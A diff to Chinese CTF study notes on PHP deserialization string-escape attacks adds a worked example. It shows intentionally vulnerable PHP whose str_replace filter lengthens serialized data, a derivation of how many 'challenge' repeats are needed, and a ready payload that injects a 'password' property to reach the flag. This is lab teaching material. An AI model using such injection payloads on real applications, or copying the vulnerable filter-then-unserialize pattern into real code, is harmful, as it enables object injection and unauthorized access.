@@ -803,7 +803,7 @@ payload：v2=随意
 
 ## 13.13 字符串逃逸例题-增多
 
-### 例题代码
+### 例题代码1
 
 ```php
 <?php
@@ -849,6 +849,69 @@ filter函数将传入的 flag 或 php 全部替换成 hack
 
 payload：phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22;s:4:%22pass%22;s:8:%22escaping%22;}
 ```
+
+
+
+### 例题代码2 - 除不尽
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+class a
+{
+    public $uname;
+    public $password;
+    public function __construct($uname,$password)
+    {
+        $this->uname=$uname;
+        $this->password=$password;
+    }
+    public function __wakeup()
+    {
+            if($this->password==='easy')
+            {
+                include('flag.php');
+                echo $flag;    
+            }
+            else
+            {
+                echo 'wrong password';
+            }
+        }
+    }
+
+function filter($string){
+    return str_replace('challenge','easychallenge',$string);
+}
+
+$uname=$_GET[1];
+$password=1;
+$ser=filter(serialize(new a($uname,$password)));
+$test=unserialize($ser);
+?>
+```
+
+### payload 构造
+
+在除不尽的情况下，要添加额外字符，且要添加到`;}`后面
+
+```
+目标：";s:8:"password";s:4:"easy";} = 29
+
+得方程：9x + 29 = 13x	除不尽
+
+目标添加额外字符：";s:8:"password";s:4:"easy";}aaa = 32
+得方程：9x + 32 = 13x
+			x  = 8
+            
+payload：challengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";}aaa
+```
+
+
+
+
 
 ## 13.14 字符串逃逸例题
 
